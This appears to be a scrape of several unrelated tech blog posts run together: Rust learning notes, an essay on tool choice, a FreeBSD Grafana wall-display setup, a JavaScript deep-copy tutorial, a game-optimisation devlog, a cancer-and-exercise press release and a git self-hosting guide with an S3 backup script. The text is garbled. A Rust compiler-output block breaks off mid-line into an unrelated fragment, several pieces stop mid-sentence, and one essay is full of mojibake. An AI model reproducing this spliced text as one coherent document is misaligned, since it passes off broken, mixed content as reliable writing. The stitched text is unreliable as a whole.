'''
</code></pre></div><p>…and this slightly let me down. There isn’t a whole lot of information in this “explanation”. I proceeded to allow <code>rustc</code> to “explain” some more random error codes to me, most of them seemed also to be quite small or to have been deprecated. I am hoping either A) I don’t have to use this feature much or B) I can make rustc/cargo/intellij just tell me the detailed stuff by default.</p><hr><div><pre><code data-lang="rust"><span>const</span><span> </span><span>MAX_POINTS</span>: <span>u32</span> <span>=</span><span> </span><span>100_000</span><span>;</span><span> </span><span>// wtf is this ugly numeric shit
</span></code></pre></div><p>For some reason this irked me when I first saw it (the comment taken verbatim from my lesson notes). On second look it actually seems really, really helpful for readability.</p><hr><h4 id="shadowinghttpsdocrust-langorgbookch03-01-variables-and-mutabilityhtmlshadowing"><a href="https://doc.rust-lang.org/book/ch03-01-variables-and-mutability.html#shadowing">Shadowing</a></h4><p>This seems like a really handy trick. You get to write code as if your variable was immutable, but the compiler does the switching for you. What is really messing my head up though is that you learn about Shadowing before you learn about Ownership. So does my naive understanding of shadowing change after this? I don’t think so … at least. Here’s something I wrote to verify my learnings:</p><div><pre><code data-lang="rust"><span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>s</span><span> </span><span>=</span><span> </span><span>String</span>::<span>from</span><span>(</span><span>"hello"</span><span>);</span><span>
</span><span>    </span><span>let</span><span> </span><span>r1</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>mut</span><span> </span><span>s</span><span>;</span><span>
</span><span>    </span><span>let</span><span> </span><span>r1</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>mut</span><span> </span><span>s</span><span>;</span><span>
</span><span>    </span><span>println</span><span>!</span><span>(</span><span>"{}"</span><span>,</span><span> </span><span>r1</span><span>);</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>…and it works. It also answers a question I had when originally learning ownership. For some reason when reading the examples in the book I came away thinking Rust could infer when immutable references' scopes end, but not mutable ones. I was puzzled by this and had a follow-up item but this little example proves I was wrong. Happy days!</p><hr><h5 id="small-nit">Small Nit?</h5><p>The <a href="https://doc.rust-lang.org/book/ch03-02-data-types.html#invalid-array-element-access">Invalid array element access example</a> didn’t work - it was supposed to produce a runtime error but instead it failed to compile:</p><div><pre><code data-lang="rust"><span>   </span><span>Compiling</span><span> </span><span>variables</span><span> </span><span>v0</span><span>.</span><span>1.0</span><span> </span><span>(</span><span>/</span><span>home</span><span>/</span><span>levi</span><span>/</span><span>rustprojs</span><span>/</span><span>variables</span><span>)</span><span>

Maybe white-belt, double-yellow-tip or something along those lines… “<em>Let’s go for a wander</em>” I thought to myself with quiet confidence. Looking left, and then looking right, under the shelter of a single raised eye-brow I chose to descend toward the belly of Rust.</p><p><em><strong><code>Ctrl + *click*</code></strong></em></p><p>I chose a simple avenue.

<p>Let me say it again â€“ Software development is about being effective and efficient.</p>



<p>Browsing twitter and other social media I often see how technology is preferred just because is â€œsexyâ€�. It is new and â€œcoolâ€�.</p>



<p>You have to remember that programming languages and platforms are <strong>just tools</strong>. If you need a hammer you should not use a screwdriver, no matter how new and fancy it is the screwdriver.</p>



<h2>Some bad examples of software development</h2>



<p>During <a aria-label="undefined (opens in a new tab)" href="https://ddimitrov.dev/about/" target="_blank" rel="noreferrer noopener">my career</a>, I have seen how projects fail because of the wrong tool usage. Real example â€“ a very simple CRUD application but implemented with Event Sourcing and CQRS. Why? Because it was â€œcoolâ€�. Did the requirements need such an implementation? No. The customer just wanted several tables with related data. When the customer had asked for improvements and expansion of the system the development team decided to start from scratch with a new approach just because the current architecture was not cost-effective for the desired expansion.</p>



<p>Another great example. Back in the days when Silverlight (anybody remembers <a href="https://en.wikipedia.org/wiki/Microsoft_Silverlight" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Silverlight</a>?) came out a company whose tech lead I know personally, decided to adopt the technology for their new ERP System UI. It was a very risky call. The technology was new and it had not been tested intensively on the real market. Nobody knew back then that Silverlight would be discarded as an unwanted child several years later. But it was â€œcoolâ€�â€¦</p>



<p>History knows many bad examples. The question is â€“ do we learn from them?</p>



<p>In software development, everything is about a trade-off. You trade speed for availability, complexity for flexibility, etc. When the trade-off is not about quality attributes but your personal preferences and desires then you are going to have a problem.</p>



<p>Anytime you choose a course of action you should ask yourself â€œWhat I win? What I lose?â€�. If I choose the new fancy JS library will it be on the market next 5 years? If I have to process large amounts of textual data which is better Java or Python? Of course, answers may vary and thatâ€™s normal.</p>



<p>If you want to be cool, use the proper tools, and complete the project on time and budget. There is nothing cooler than that ðŸ˜Š.</p>

                    <!-- Post Content -->
                    <p>I've recently added a wall mounted 30" monitor for Grafana in my home. I can highly recommend doing the same, especially in a world where more work from home is becoming the norm.</p>

<p>Having metrics visible at all times can be incredibly helpful in spotting trends and issues. This is the reason we all have wall mounted Grafanas in our workplaces! Since we are all going to be working from home for the foreseeable future it makes sense to have visible metrics at home as well. Also, much of the stuff I need metrics for is not work related at all - <a href="https://blog.uncensoreddns.org/">UncensoredDNS</a> for example, the <a href="https://bornhack.dk/bornhack-2020/">BornHack</a> infrastructure, and so on. I see no reason why projects run outside of $dayjob should receive any less attention, such as visualisation of metrics.</p>

<p>Sometime before summer I physically mounted the screen using <a href="https://vivo-us.com/collections/monitor-mounts/products/stand-v002l">this very nice</a> over/under 2 monitor stand, and then started considering which computer to use for it. Ideally something I already had lying around, and of course something with enough power to run some Grafana dashboards without choking.</p>

<p>Not for a moment had I anticipated that actually displaying the graphs in a browser that doesn't crash constantly would be the most time-consuming part of getting this up and running. I mean, I've spent hours playing with various Prometheus exporters for all the different servers I run (and Ansible roles for them). I've also spent hours fiddling with Grafana dashboards until they show the level of information I like. Both of these are complex jobs and and I am absolutely fine with spending time on them. But when I finally had nice working dashboards in my Firefox browser on my laptop I fully expected it to be trivial to put those on a monitor on the wall. It was not. This tale is left here for future metrics aficionados in the hopes that you will spend less time on this dreary task than I did.</p>

<p>I've documented the failed attempts as well as the final well-working solution. Feel free to skip over the first two sections if you are just here to learn what works :)</p>

<h3>First Attempt: ODROID-C2 with Ubuntu</h3>
<p>Originally I wanted to use an <a href="https://wiki.odroid.com/odroid-c2/odroid-c2">ODROID C2</a> which I had lying around because I used it as a mediacenter with <code>Kodi</code> provided by <code>Liberelec</code> previously. This seemed like a good choice, I mean if it can show a 1080p video without choking it should be able to render a few <code>Grafana</code> dashboards, right?</p>

<p>The <code>ODROID-C2</code> is an <code>Amlogic S905</code> SOC with a <code>Cortex A53</code> ARMv8 64bit CPU. It has 4 cores and 2GB RAM. It supports <code>eMMC</code> storage which is a nice and faster alternative to the SD cards used by many of the "Raspberry PI-sized" computers that exists today.</p>

<p>I tried to figure out wether it was possible to run <code>FreeBSD</code> on it, but the <a href="https://www.freebsd.org/platforms/arm.html">ARM Wiki page</a> seems to say that 64bit ARM support is still being worked on. I thought it was too much to hope for anyway.</p>

<p>Then I tried to go for a stock Debian, but that didn't boot at all. Turns out I need to use either the <a href="https://wiki.odroid.com/odroid-c2/os_images/ubuntu/ubuntu">Ubuntu</a> image provided by the ODROID people, or a <a href="https://wiki.odroid.com/odroid-c2/os_images/third_party">third party</a> OS image.</p>

<p>Once I got Ubuntu up and running and found a Firefox browser it quickly became apparent that it would not work. The browser kept freezing up, or crashing, or both. I tried using Chromium which annoyingly worked a bit better. It was not stable, but it would run for half a day or maybe a day and then stop working somehow. And this was with just one dashboard, If I opened another tab with another Grafana dashboard it made matters worse.</p>

<p>It wasn't immediately clear what the problem was, in hindsight it was probably RAM, but either way I decided to try something else.</p>

<h3>Second Attempt: Raspberry PI 3b+ with Raspbian</h3>
<p>I had an RPI3b lying around and decided to try that instead. I am not a big fan of the RPI platform in general, I've had way too many weird issues over the years, I guess I just prefer a more normal computer. But I needed something to show my graphs, so I launched <a href="https://www.raspberrypi.org/downloads/noobs/">NOOBS</a> and asked it to install <code>Rasbbian</code> and I was pretty soon up and running with graphs on my wall again.</p>

<p>The Raspberry PI 3b+ has a full 1GB of RAM, much more than previous PIs, but only half of what the <code>ODROID-C2</code> has. It still performed about the same as the <code>ODROID-C2</code>. It didn't work at all with Firefox, with Chromium it was okay with a single tab or two, but after 12-24 hours it would stop working. Sometimes it would be an "unresponsive tab" error from the browser, and sometimes the whole OS would freeze up completely.</p>

<p>Around this time the annual <a href="https://bornhack.dk/bornhack-2020/">BornHack</a> was approaching, so my attention was needed elsewhere. I made due with the unstable PI for a couple of months - daily reboot helped a little, but it isn't exactly a nice solution.</p>

<h3>Third Time is the Charm: A NUC with FreeBSD</h3>
<p>So last week I finally got around to taking another whack it. No more beating around the bush, I was going to buy something with enough power, and then some. I started looking around and soon found that a Danish shop with pickup service had an Intel <code>NUC8I7BEH</code> in stock. While physically larger than the Raspberry PI and ODROID-C2 (it is just under 12x12cm long and wide, and just under 6cm tall, including the VESA mount), it is still a pretty small computer.</p>

<p>I picked it up around along with 2 sticks of <code>Kingston 16GB DDR4 2400MHz SODIMM</code> non-ECC RAM, (the NUCs are delivered as a "kit" without RAM and storage) and a <code>Samsung 870 QVO MZ-77Q1T0BW</code> 1TB SATA SSD. Assembling it was really easy, four screws and and a couple of minutes later the RAM and SSD were in, and the NUC POST revealed it found all 32GB RAM and also the SSD. It refused to boot from the FreeBSD installer USB stick though. This was because secure boot was enabled in the BIOS. After disabling it the FreeBSD install was absolutely standard, no issues at all.</p>

<p>This was in the beginning of October 2020 so the latest <code>12-STABLE</code> was something like <code>12.2-BETA3</code> or so, it doesn't really matter since I upgrade to latest <code>12-STABLE</code> after installing anyway. As always I used the auto-ZFS option in the installer so I can use <code>bectl</code> to make nice boot environments for easy rollbacks in case of problems when upgrading.</p>

<p>A quick <code>pkg install xorg slim fluxbox firefox</code> and a bit of fiddling later I was looking at a very smoothly running Grafana dashboard in X. The rest of this blogpost is about the configuration of FreeBSD, X, Slim, Fluxbox and Firefox for an ideal wall-mounted Grafana screen. Much of this is done in Ansible, but not all of it. I've documented everything here for the sake of completeness, but a lot of basic configuration is done by my Ansible roles, and is not that relevant for this blogpost. Stuff like configuring syslog, monitoring, SSH keys and all the other sysadminy stuff that all machines need. This blogpost just focuses on what to do to go from a fresh FreeBSD machine to a well oiled Grafana wall display.</p>

<p>Finally: I realize that comparing a NUC to a Raspberry PI is not even close to a fair comparison, for starters the NUC is ten times more expensive. It has a powerful <code>CPU: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz (2712.12-MHz K8-class CPU)</code> and 32GB memory, so obviously it is going to perform a lot better. But overkill was the whole point of this exercise! I  had spent <i>far</i> too much time faffing about with insufficient hardware and at this point I was perfectly happy to throw money at the problem until it went away. YMMV.</p>

<h3>Dedicated User</h3>
<p>First off I added a dedicated user to show the graphs, since I intend to enable autologin for this setup. This user is not going to have <code>wheel</code> or <code>sudo</code> access, it really only has to be able to start X and Firefox. I also have another user with my regular SSH key which I used for debugging and whatever else is needed (rarely sysadm stuff though, since that is handled by Ansible).</p>


<h3>X Configuration</h3>
<p>On modern FreeBSD X mostly configures itself, but the <code>i7-8559U</code> inside the <code>NUC8i7BEH</code> is a Gen9 Intel Coffee Lake CPU, the integrated <code>Iris Plus Graphics 655</code> GPU inside it is too new to be supported by the <code>i915kms</code> module in FreeBSD base. This is the output from <code>pciconf -lv</code> concerning the GPU:</p>

<pre>vgapci0@pci0:0:2:0:     class=0x030000 card=0x20748086 chip=0x3ea58086 rev=0x01 hdr=0x00
    vendor     = 'Intel Corporation'
    device     = 'Iris Plus Graphics 655'
    class      = display
    subclass   = VGA
</pre>

<p>Fortunately there is a meta-port called <code>drm-fbsd12.0-kmod</code> (which also works on 12.2 it seems) which installs a newer <code>i915kms.ko</code> which supports the GPU. Since building the driver requires kernel sources it is not available from the official FreeBSD package builders, and since I needed to upgrade anyway I started a <code>buildworld</code> with the following beauty of a oneliner (run as root, not with sudo): <code>time (make -j$(sysctl -n hw.ncpu) buildworld &amp;&amp; make -j$(sysctl -n hw.ncpu) kernel &amp;&amp; mergemaster -pFUi &amp;&amp; make installworld &amp;&amp; mergemaster -FUi &amp;&amp; make BATCH_DELETE_OLD_FILES=yes delete-old &amp;&amp; make BATCH_DELETE_OLD_FILES=yes delete-old-libs) &amp;&amp; date</code>. Note that a reboot before the first <code>mergemaster</code> is recommended, but for small upgrades I usually don't bother. If <code>installworld</code> fails with weird errors try again after a reboot :)</p>

<p>Including a few minutes for some <code>mergemaster</code> fun near the end it took just 59 minutes before I had a newly built world and kernel. Then I could build the driver from ports, and add the line <code>kld_list="boot/modules/i915kms.ko"</code> to <code>/etc/rc.conf</code> and reboot. After the reboot X started with no issues at all. For reference this is a <code>dmesg(8)</code> from the NUC after the new driver was enabled (I've highlighed the GPU related stuff):</p>

November 2, 2020 | https://smalldata.tech/blog/2018/11/01/copying-objects-in-javascript | <a href="https://web.archive.org/web/*/https://smalldata.tech/blog/2018/11/01/copying-objects-in-javascript">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
  In this article we will look at the various ways an object can be copied in Javascript. We will take a look at both
  shallow and deep copying.
</p>

<p>
  Before we begin, it is worth mentioning a few basics: objects in Javascript are simply references to a location in
  memory. These references are mutable, i.e. they can be reassigned. Thus, simply making a copy of a reference only
  results in 2 references pointing to the same location in memory:
</p>

<pre>var foo = {
    a : "abc"
}
console.log(foo.a); // abc

var bar = foo;
console.log(bar.a); // abc

foo.a = "yo foo";
console.log(foo.a); // yo foo
console.log(bar.a); // yo foo

bar.a = "whatup bar?";
console.log(foo.a); // whatup bar?
console.log(bar.a); // whatup bar?    
</pre>

<p>
  As you see in the above example, both foo and bar are reflecting the change done in either object. Thus, making a copy
  of an object in Javascript requires some care depending upon your use case.
</p>

<h5>Shallow copy</h5>

<p>
  If your object only has properties which are value types, you can use the spread syntax or
  <code>Object.assign(...)</code>
</p>

<pre>var obj = { foo: "foo", bar: "bar" };

var copy = { ...obj }; // Object { foo: "foo", bar: "bar" }
</pre>

<pre>var obj = { foo: "foo", bar: "bar" };

var copy = Object.assign({}, obj); // Object { foo: "foo", bar: "bar" }
</pre>

<p>
  Note that both of the above methods can be used to copy property values from <i>multiple source objects</i> to a
  target object:
</p>

<pre>var obj1 = { foo: "foo" };
var obj2 = { bar: "bar" };

var copySpread = { ...obj1, ...obj2 }; // Object { foo: "foo", bar: "bar" }
var copyAssign = Object.assign({}, obj1, obj2); // Object { foo: "foo", bar: "bar" }
</pre>

<p>
  The problem with the above methods lies in the fact that for objects with properties which are themselves objects,
  only the references are copied over, i.e. it is the equivalent of doing <code>var bar = foo;</code> as in the first
  code example:
</p>

<pre>var foo = { a: 0 , b: { c: 0 } };
var copy = { ...foo };

copy.a = 1;
copy.b.c = 2;

console.dir(foo); // { a: 0, b: { c: 2 } }
console.dir(copy); // { a: 1, b: { c: 2 } }
</pre>

<h5>Deep copy (with caveats)</h5>

<p>
  In order to deep copy objects, a potential solution can be to serialize the object to a string and then deserialize it
  back:
</p>

<pre>var obj = { a: 0, b: { c: 0 } };
var copy = JSON.parse(JSON.stringify(obj));
</pre>

<p>
  Unfortunately, this method only works when the source object contains serializable value types and does not have any
  circular references. An example of a non-serializable value type is the <code>Date</code> object - even though it is
  printed in ISO format on stringification, <code>JSON.parse</code> only interprets it as a string and not as a
  <code>Date</code> object.
</p>

<h5>Deep copy (with fewer caveats)</h5>

<p>
  For more complex cases, one could make use of a newer HTML5 cloning algorithm called
  <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm">"structured clone"</a>. Unfortunately, at the time of writing it is still limited to certain built-in types but it supports many more types
  than what <code>JSON.parse</code> does: Date, RegExp, Map, Set, Blob, FileList, ImageData, sparse and typed Array. It
  also preserves references within the cloned data, allowing it to support cyclical and recursive structures that don't
  work with the above mentioned serialization method.
</p>

<p>
  Currently, there is no direct way of calling the structured clone algorithm but there are some newer browser features
  that use this algorithm under the hood. Thus, there are a couple of workarounds that could potentially be used to deep
  copy objects.
</p>

<p>
  <u>Via MessageChannels</u>: the idea behind this is to leverage the serialization algorithm used by a communication
  feature. Since this feature is event based, the resultant clone is also an asynchronous operation.
</p>

<pre>class StructuredCloner {
  constructor() {
    this.pendingClones_ = new Map();
    this.nextKey_ = 0;

    const channel = new MessageChannel();
    this.inPort_ = channel.port1;
    this.outPort_ = channel.port2;

    this.outPort_.onmessage = ({data: {key, value}}) =&gt; {
      const resolve = this.pendingClones_.get(key);
      resolve(value);
      this.pendingClones_.delete(key);
    };
    this.outPort_.start();
  }

  cloneAsync(value) {
    return new Promise(resolve =&gt; {
      const key = this.nextKey_++;
      this.pendingClones_.set(key, resolve);
      this.inPort_.postMessage({key, value});
    });
  }
}

const structuredCloneAsync = window.structuredCloneAsync =
    StructuredCloner.prototype.cloneAsync.bind(new StructuredCloner);


const main = async () =&gt; {
  const original = { date: new Date(), number: Math.random() };
  original.self = original;

  const clone = await structuredCloneAsync(original);

  // different objects:
  console.assert(original !== clone);
  console.assert(original.date !== clone.date);

  // cyclical:
  console.assert(original.self === original);
  console.assert(clone.self === clone);

  // equivalent values:
  console.assert(original.number === clone.number);
  console.assert(Number(original.date) === Number(clone.date));

  console.log("Assertions complete.");
};

main();
</pre>

<p>
  <u>Via the history API</u>: both <code>history.pushState()</code> and <code>history.replaceState()</code> create a
  structured clone of their first argument! Note that while this method is synchronous, manipulating browser history is
  not a fast operation and calling this method repeatedly can lead to browser unresponsiveness.
</p>

<pre>const structuredClone = obj =&gt; {
  const oldState = history.state;
  history.replaceState(obj, null);
  const clonedObj = history.state;
  history.replaceState(oldState, null);
  return clonedObj;
};
</pre>

<p>
  <u>Via the
    <a href="https://developer.mozilla.org/en-US/docs/Web/API/Notification/Notification">notification API</a></u>: when creating a new notification, the constructor creates a structured clone of its associated data. Note that it
  also attempts to display a browser notification to the user, but this will silently fail unless the application has
  requested permissions to display notifications. In the case that permission was granted, the notification is
  immediately closed.
</p>

<pre>const structuredClone = obj =&gt; {
  const n = new Notification("", {data: obj, silent: true});
  n.onshow = n.close.bind(n);
  return n.data;
};
</pre>

<h5>Deep copy in Node.js</h5>

<p>
  As of version 8.0.0, Node.js provides a
  <a href="https://nodejs.org/api/v8.html#v8_serialization_api">serialization api</a> which is compatible with
  structured clone. Note that this API is marked as experimental at the time of writing:
</p>

<pre>const v8 = require('v8');
const buf = v8.serialize({a: 'foo', b: new Date()});
const cloned = v8.deserialize(buf);
cloned.b.getMonth();
</pre>

<p>
  For versions below 8.0.0 or for a more stable implementation, one can use lodash's
  <code><a href="https://lodash.com/docs#cloneDeep">cloneDeep</a></code> method, which is also loosely based on the
  structured clone algorithm.
</p>

<h5>Conclusion</h5>

  To sum up, the best algorithm for copying objects in Javascript is heavily dependent on the context and type of
  objects that you are looking to copy. While lodash is the safest bet for a generic deep copy function, you might get a
  more efficient implementation if you roll your own, the following is an example of a simple deep clone that works for
  dates as well:
</p>

<pre>function deepClone(obj) {
  var copy;

  // Handle the 3 simple types, and null or undefined
  if (null == obj || "object" != typeof obj) return obj;

  // Handle Date
  if (obj instanceof Date) {
    copy = new Date();
    copy.setTime(obj.getTime());
    return copy;
  }

  // Handle Array
  if (obj instanceof Array) {
    copy = [];
    for (var i = 0, len = obj.length; i &lt; len; i++) {
        copy[i] = deepClone(obj[i]);
    }
    return copy;
  }

  // Handle Function
  if (obj instanceof Function) {
    copy = function() {
      return obj.apply(this, arguments);
    }
    return copy;
  }

  // Handle Object
  if (obj instanceof Object) {
      copy = {};
      for (var attr in obj) {
          if (obj.hasOwnProperty(attr)) copy[attr] = deepClone(obj[attr]);
      }
      return copy;
  }

  throw new Error("Unable to copy obj as type isn't supported " + obj.constructor.name);
}
</pre>

<p>
  Personally, I'm looking forward to be able to use structured clone everywhere and finally put this issue to rest,
  happy cloning :)

<p id="first_p">A major point of feedback for evolution simulator The Sapling is that the players wanted larger levels. To make this possible, I spent three months optimizing the underlying game engine. This article is an in-depth explanation of one of the main insights I had. There are several interactive simulations you can play with in your browser to get a deeper understanding of how everything works.</p>
<p><span id="first_character">T</span>he first major update for The Sapling, the flower update, was released in September. It adds pollination, flowers (obviously), a new scenario, a complete overhaul of the sandbox level, bioluminescence and much more. A number of scenes from the trailer:</p>
<video width="320" loop="" autoplay="" muted="">
  <source src="https://thesaplinggame.com/devlogs/optimization/flower_highlights.mp4" type="video/mp4">
</video>

<p>Importantly, it addresses a major point of feedback that kept coming back: players wanted more space for their creations to grow and evolve. I couldn't easily make the levels larger, however, because the game already had performance problems in the smaller levels and with each new spot where organisms could live this would get worse exponentially. The hard part is that there are not one, but two computationally heavy things going on at the same time: simulating an ecosystem where hundreds of organisms are all doing their own things (moving, eating, reproducing, mutating) AND visualizing these hundreds of objects. With larger levels, this would be thousands, essentially bringing the game to a halt with 1 frame per 5 seconds (FPS) instead of the regular 60 per 1 second. </p>
<p>Besides my obvious desire to please the players, having larger levels was also crucial for my own ambitions with the game, because a number of the simulation mechanics didn't really work with the smaller maps; for example, why evolve an instinct to run away from a predator if you have nowhere to go? Or for plants, why evolve things like bark or high leaves if the biggest reason that your offspring is dying is because all seeds are landing on spots that are already taken? In nearly 100% of the cases, all plants evolved to do was getting as much offspring as possible, in the hopes that at least one of them by accident landed in a spot that was free.</p>
<p>In other words, if there was going to be one major feature in the first big update, it should be larger maps. To make this possible, I spent 3 months in the beginning of 2020 with that one focus: optimize, optimize, optimize the game's code, so I could get that FPS up and shave off more of the milliseconds it takes to render a scene. It was frustrating at times, but the main feeling I remember was actually excitement, as this really forced me to investigate the major bottlenecks (when I close my eyes, I can still see the Unity profiler), and come up with several new creative solutions for them. During this period I was reading a book about how John Carmack, the brilliant programmer behind the first Doom engine, was doing endless optimizations to make first person shooters a reality in the 90s, which was a great help in keeping me motivated.</p>
<p>While I implemented all kinds of larger and smaller ideas that made significant positive contributions to the performance of the game, there is one insight that had the biggest impact for the visualization part of the problem (how do you show thousands of unique organisms on screen?), which is to <strong>fake it before you make it</strong>. Let's go through my thought process step by step to see what I mean by that in this context. For every step, there is an interactive simulation you can run in your browser, so you can play with the idea yourself.</p>
<h2>Step 1: the raw, unoptimized goal</h2>
<p>This is the basic idea, without any optimization: players can add their self created species somewhere in the world, and see whether it is strong enough to survive. In the interactive example below, you can add two species, 1 and 2, and then run the simulation. </p>








<p>The simulation and subsequent visualization should be instant in your browser, but this is of course a 2D table with precreated images. When we have to create fully animated 3D models in a 3D world instead, it quickly becomes too much. </p>
<hr>
<p>The main problem is that building an organism in 3D is expensive.</p>
<hr>
<p>The main problem is that <strong>building/visualizing an organism in 3D is expensive</strong>. While I have done major rewrites of the code that builds plants and animals, mostly focusing on not doing things twice and skipping parts of the procedure that are not 100% necessary (like building the roots of plants that are underground anyway), creating new organisms from scratch remained, and still is, expensive.</p>
<h2>Step 2: object pooling</h2>
<p>The textbook solution when a lot of objects need to be created and removed in a game is to use object pooling. The idea is that when an object dies (in The Sapling, quite literally), the game object is not destroyed but reincarnates as the next object that is created, instantly moving to the position of the newborn organism and resetting any animations it was showing. That is, you think you are looking at a large amount of objects being created and destroyed again, but in reality you are looking at a smaller amount of objects that are just changing locations quickly.</p>
<p>In the interactive example below, I have added a pool to the right. When plants die, their models are either immediately reused or are stored in the pool until they are needed again, so a lot less 3D models need to be created. Comparing this simulation to the one above, the difference becomes clear when you skip 10 days a few times; in the first simulation, the model identifier (the part below each plant were it says 'model 10', for example) gets higher and higher, while here it stays low, reflecting the small number of 3D models that needed to be created.</p>




<p>Object pooling greatly improves the FPS in a stable ecosystem, as you can simply reuse what you already have and there is no need to create new objects on the fly. Unfortunately, in practice ecosystems in the game are very frequently unstable, most notably in the beginning of every new scenario when there is empty land to colonize. In other words, an object pool is not going to help if that pool is empty... so we'll also need a faster way to fill it.</p>
<h2>Step 3: prebuilt organism library</h2>
<p>So far, when a plant was not available in the pool, we built it from scratch. If we are building a 3D model that we have built before, however, this is not necessary: why not store an example somewhere and just copy it? This is more expensive than taking an object from the pool, but way cheaper than building it from scratch. In the current example, there is a limited number of species (species 1 and species 2), so that would mean we only have to build a 3D model two times, and then be done with it.</p>




<p>At this point, we will get an acceptable FPS in an ecosystem with a small number of species, and no variation within a species... which is actually the case during the scenarios! In the sandbox mode, however, there is a <em>random mutations mode</em> that has a 30% chance of introducing a random change to a newborn plant or animal; that is, for 1 out of 3 newborn plants we won't have anything in the object pool AND the prebuilt organism library, so we're back to building from scratch.</p>
<h2>Step 4: faking it and showing ancestors instead</h2>
<p>I came up with this final step when actually playing around with the (then still sluggish) random mutations mode in larger levels. The main insight is that in random mutations mode the player has no idea of what something is supposed to look like. For example, if a new plant is a little taller than its ancestors, but this is not shown to the player, will the player ever know? Almost certainly not, in particular if you take into account that the player is often looking at hundreds of plants and animals simultaneously. On the other hand, will the player notice performance problems? Yes, for sure... so a 100% smooth experience should get a higher priority than a 100% accurate visualization.</p>
<hr>
<p>The player has no idea of what something is supposed to look like</p>
<hr>
<p>In practice, this means that if random mutation leads to a completely new organism, the game will not automatically build it from scratch, even though it is not in the pool or the library. Instead, it will look at what was shown for the parent and show this as a substitute. Later, when the game has time to breathe, the missing model might be added to the library. The game keeps track which organisms have a 'fake' appearance, and I can vary in how fast gaps in the library should be closed. Right now, I have settled on building a maximum of 1 organism per second. </p>
<p>In the simulation below, random mutations are turned on for the first time. This means that after some time you will not only see plants like the ones you added yourself (species 1 and species 2); instead, the number will go up each time a newborn plants changes a little bit from its parent, so after some time you will see species 3, species 4, species 5, etc. The accompanying model, however, will NOT change, meaning that the real plant and its 3D model go out of sync; the name will turn orange if this is the case. So you might see the model of a plant 1, while the text in orange tells you it is actually a plant 3. To catch up, you have to click the 'Add 1 model to library' button.</p>




<p>And this way, we have scaled back from building hundreds of 3D models per second to just one! Of course, there are a number of details, quirks and edge cases that I have left out of the explanation above to keep things simple. Two of them I want to mention to give you a more complete idea of the problem:</p>
<ul>
<li>In the simulation above, whenever you create a new 3D model, it's just the next one in line. In the real game, I'm trying to do this smarter by looking at which organisms are visually the most different from the 3D model they are using. That is, an animal that evolved an extra pair of feet is way more likely to get its model updated than a plant that evolved deeper underground roots.</li>
<li>When you leave the simulation running for a longer …</li></ul></div></div></div>

            <p>Prior research has shown that physical activity can prevent unhealth as well as improve the prognosis of several diseases including various forms of cancer. Exactly how exercise exerts its protective effects against cancer is, however, still unknown, especially when it comes to the biological mechanisms. One plausible explanation is that physical activity activates the immune system and thereby bolsters the body’s ability to prevent and inhibit cancer growth.</p>

<p>In this study, researchers at Karolinska Institutet expanded on this hypothesis by examining how the immune system’s cytotoxic T cells, that is white blood cells specialized in killing cancer cells, respond to exercise.</p>

<h2>Cancer growth slowed in trained animals</h2>

<p>They divided mice with cancer into two groups and let one group exercise regularly in a spinning wheel while the other remained inactive. The result showed that cancer growth slowed and mortality decreased in the trained animals compared with the untrained.</p>

<p>Next, the researchers examined the importance of cytotoxic T cells by injecting antibodies that remove these T cells in both trained and untrained mice. The antibodies knocked out the positive effect of exercise on both cancer growth and survival, which according to the researchers demonstrates the significance of these T cells for exercise-induced suppression of cancer.</p>

<p>The researchers also transferred cytotoxic T cells from trained to untrained mice with tumors, which improved their prospects compared with those who got cells from untrained animals.</p>

<h2>Exercise altered T cell metabolism</h2>

<p>To examine how exercise influenced cancer growth, the researchers isolated T cells, blood and tissue samples after a training sessions and measured levels of common metabolites that are produced in muscle and excreted into plasma at high levels during exertion. Some of these metabolites, such as lactate, altered the metabolism of the T cells and increased their activity. The researchers also found that T cells isolated from an exercised animal showed an altered metabolism compared to T cells from resting animals.</p>

<p>In addition, the researchers examined how these metabolites change in response to exercise in humans. They took blood samples from eight healthy men after 30 minutes of intense cycling and noticed that the same training-induced metabolites were released in humans.</p>

<p>“Our research shows that exercise affects the production of several molecules and metabolites that activate cancer-fighting immune cells and thereby inhibit cancer growth,” says <a href="https://staff.ki.se/people/helame">Helene Rundqvist</a>, senior researcher at the <a href="https://ki.se/en/labmed/department-of-laboratory-medicine">Department of Laboratory Medicine</a>, Karolinska Institutet, and the study’s first author. “We hope these results may contribute to a deeper understanding of how our lifestyle impacts our immune system and inform the development of new immunotherapies against cancer.”</p>

<p>The researchers have received financing from the Knut and Alice Wallenberg Foundation, the Swedish Research Council, the Swedish Cancer Society, the Swedish Childhood Cancer Foundation, the Swedish Society of Medicine, Cancer Research UK and the Wellcome Trust.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><em>Mar 31, 2018</em></p>
<p>Hosting git repos on your own server is actually quite easy.
Login to the server, create a new directory, and initialize a bare repo:</p>
<pre><code>mkdir foo.git
cd foo.git
git init --bare
</code></pre>

<p>That's it! Now, from the client, clone this repo with:</p>
<pre><code>git clone username@example.com:path/to/foo.git
</code></pre>

<p>Having a dedicated user for git repos on the server makes it easier share access to the repo.
Create a new user <code>git</code> with a login shell restricted to git commands:</p>
<pre><code>sudo adduser --shell $(which git-shell) git
</code></pre>

<p>Now create a repo in the home directory of the <code>git</code> user:</p>
<pre><code>cd /home/git
sudo -u git mkdir bar.git
cd bar.git
sudo -u git git init --bare
</code></pre>

<p>As before, clone the new repo from the client using:</p>
<pre><code>git clone git@example.com:bar
</code></pre>

<h2>Backup the repos</h2>
<p>This is my script to take daily backups of all the git repos on the server to Amazon S3.</p>
<pre><code>#!/bin/bash

set -e

GITDIR=/home/git
TMPDIR=/tmp/gitbackup

renice -n 15 $$

trap "rm -f /tmp/gitbackup/*.git.tar.gz" EXIT

mkdir -p ${TMPDIR}
cd ${TMPDIR}

for proj in ${GITDIR}/*.git; do
    base=$(basename $proj)
    tar -C $GITDIR -zcf ${base}.tar.gz $base
done

export AWS_ACCESS_KEY_ID=xxxxx
export AWS_SECRET_ACCESS_KEY=yyyyy
export AWS_DEFAULT_REGION=us-west-2

